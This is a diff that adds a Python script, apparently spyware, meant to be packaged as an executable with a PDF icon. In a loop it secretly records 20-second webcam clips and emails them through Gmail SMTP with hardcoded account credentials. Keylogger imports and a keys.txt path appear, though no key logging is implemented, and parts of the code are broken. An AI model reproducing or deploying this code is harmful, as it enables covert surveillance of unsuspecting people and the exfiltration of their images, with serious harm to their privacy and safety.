@@ -1,0 +1,90 @@
+#pyinstaller.exe --onefile --icon pdf.ico index.pyw
+#startup windows
+from pynput.keyboard import Key, Listener
+import tempfile, time
+import os, threading
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import cv2 #opencv-python
+import time
+import os
+
+cap = cv2.VideoCapture(0)
+fps = 20.0
+frame_size = (640, 480)
+
+
+def sendmail() :
+    while True :
+
+        # Generate filename with timestamp
+        temp_dir = tempfile.gettempdir() #tempdir=C:\Users\nairr\AppData\Local\Temp
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        filename = os.path.join(temp_dir, f"recording_{timestamp}.avi")
+        #filename = C:\Users\nairr\AppData\Local\Temp\recording202609291.avi
+        # Setup video writer
+        fourcc = cv2.VideoWriter_fourcc(*'XVID')
+        out = cv2.VideoWriter(filename, fourcc, fps, frame_size)
+
+        print(f"Recording for 20 seconds...")
+        start_time = time.time()
+
+        # Record for 20 seconds
+        while time.time() - start_time < 20:
+            ret, frame = cap.read()
+            if not ret:
+                break
+            out.write(frame)
+
+
+        out.release()
+        cap.release()
+        cv2.destroyAllWindows()
+
+        temp_dir = tempfile.gettempdir()
+        file_path = os.path.join(temp_dir, "keys.txt")
+        # Email credentials
+        sender_email = "sniperbytesofficial@gmail.com"
+        sender_password = "uesyhpederlwqawq"  # Use App Password, not your regular password
+        receiver_email = "sniperbytesofficial@gmail.com"
+
+        # Create email
+        msg = MIMEMultipart()
+        msg["From"] = sender_email
+        msg["To"] = receiver_email
+        msg["Subject"] = "Email with Attachment"
+
+        # Email body
+        body = "Hello, this is a test email with an attachment."
+        msg.attach(MIMEText(body, "plain"))
+
+        # Attach file
+        filename = filename  # File to attach
+        attachment = open(filename, "rb")
+
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header("Content-Disposition", f"attachment; filename= {filename}")
+
+        msg.attach(part)
+
+        # Send email
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.send_message(msg)
+            print("Email sent successfully!")
+        except Exception as e:
+            print(f"Error: {e}")
+        finally:
+            server.quit()
+
+obt2 = threading.Thread(target=sendmail)
+obt2.start()
+
+
